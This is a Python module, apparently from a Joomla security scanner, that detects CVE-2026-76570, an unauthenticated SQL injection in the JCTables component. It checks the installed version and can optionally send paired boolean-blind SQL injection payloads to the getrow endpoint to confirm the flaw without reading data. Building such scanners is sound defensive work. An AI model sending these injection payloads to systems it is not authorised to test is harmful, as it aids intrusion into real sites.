from __future__ import annotations

from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding

CVECheckResult = Finding
from ...core.versions import parse_version_safe, version_lte

CVE_ID = "CVE-2026-76570"
NAME = "JCTables unauthenticated SQL injection"
COMPONENT = "JCTables"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe"]
AFFECTED_JOOMLA_VERSIONS = ["*"]
AFFECTED_RULE = "JCTables 1.0.0 through 1.20.0; fixed in 1.21.1"
FIXED_RULE = "Update JCTables to 1.21.1 or newer"
GETROW_ENDPOINT = "/index.php?option=com_jctables&format=json&task=getrow"


def affected_jctables(version: str | None) -> bool | None:
    parsed = parse_version_safe(version)
    if parsed is None:
        return None
    if version_lte(version, "1.20.0"):
        return True
    if not version_lte(version, "1.21.0"):
        return False
    return None


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    tables = (plugins or {}).get("jctables", {})
    found = bool(tables.get("found"))
    version = tables.get("version")
    source = tables.get("source") or "unknown"
    if not found:
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM",
            component=COMPONENT, component_version=None, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail="JCTables was not detected via component/manifest routes.",
            action="Component not detected via standard public routes; verify manually if installed elsewhere.",
        )
    verdict = affected_jctables(version)
    if verdict is True:
        return Finding(
            cve=CVE_ID, name=NAME, status="LIKELY_VULNERABLE", confidence="HIGH",
            component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"JCTables {version} is within the affected 1.0.0-1.20.0 range.",
            action=f"Update JCTables to {FIXED_RULE} and audit administrator accounts for unexpected changes.",
        )
    if verdict is False:
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_AFFECTED", confidence="HIGH",
            component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            detail=f"JCTables {version} is at or above the fixed 1.21.1.",
            action="No action is required if the installed package is vendor-original.",
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="INCONCLUSIVE", confidence="MEDIUM",
        component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=f"JCTables was detected (version: {version or 'unknown'}, source: {source}), but the affected version range is ambiguous.",
        action="Manually verify the JCTables version against the vendor advisory.",
    )


def _getrow(client: HttpClient, base: str, mid: int, tid: int, idx: str, timeout: int) -> dict | None:
    from urllib.parse import urlencode

    query = urlencode({"mid": mid, "tid": tid, "task": "getrow", "idx": idx})
    response = client.get(f"{base}{GETROW_ENDPOINT.split('?')[0]}?{query}", timeout=timeout)
    if is_transport_error(response) or response.get("status") != 200:
        return None
    return response


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    """Read-only boolean-blind differential on the getrow task.

    Sweeps a small menu/table id space with paired always-true /
    always-false ``idx`` conditions. A consistent response difference
    proves server-side SQL evaluation without reading or writing any data.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    true_cond, false_cond = "'' OR (1=1) OR ''", "'' OR (1=2) OR ''"
    attempts = 0
    for mid in range(1, 8):
        for tid in range(4):
            true_resp = _getrow(client, base, mid, tid, true_cond, timeout)
            if true_resp is None:
                continue
            false_resp = _getrow(client, base, mid, tid, false_cond, timeout)
            if false_resp is None:
                continue
            attempts += 1
            true_body = true_resp.get("body", "") or ""
            false_body = false_resp.get("body", "") or ""
            if true_body != false_body and (true_body.strip() or false_body.strip()):
                return Finding(
                    cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
                    component=COMPONENT, affected_rule=AFFECTED_RULE,
                    exploit_available=HAS_EXPLOIT, exploit_ran=True,
                    proof_url=f"{base}{GETROW_ENDPOINT}&mid={mid}&tid={tid}",
                    evidence={
                        "component_present": True,
                        "handler_reached": True,
                        "boolean_differential": True,
                        "mid": mid,
                        "tid": tid,
                        "attempts": attempts,
                    },
                    detail=(
                        "Paired always-true / always-false getrow conditions returned different responses, "
                        f"proving server-side SQL evaluation (mid={mid}, tid={tid}). "
                        "No database content was read or written."
                    ),
                    action=f"Update JCTables to {FIXED_RULE} and audit administrator accounts.",
                )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{GETROW_ENDPOINT}",
        evidence={"component_present": True, "boolean_differential": False, "attempts": attempts},
        detail="The getrow boolean differential did not trigger across the probed id space; no SQL evaluation was demonstrated.",
        action="If JCTables is at or below 1.20.0, verify manually with a seeded table.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_result(plugins)
    if not run_exploit_check:
        return result
    if exploit_mode != "safe":
        result.detail += " This CVE module only supports the safe boolean-blind getrow probe."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": ["jctables"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-76570",
            "https://www.vulncheck.com/blog/jctables-unauthenticated-sql-rw-to-rce",
            "https://www.ionix.io/threat-center/cve-2026-76570",
        ],
    }
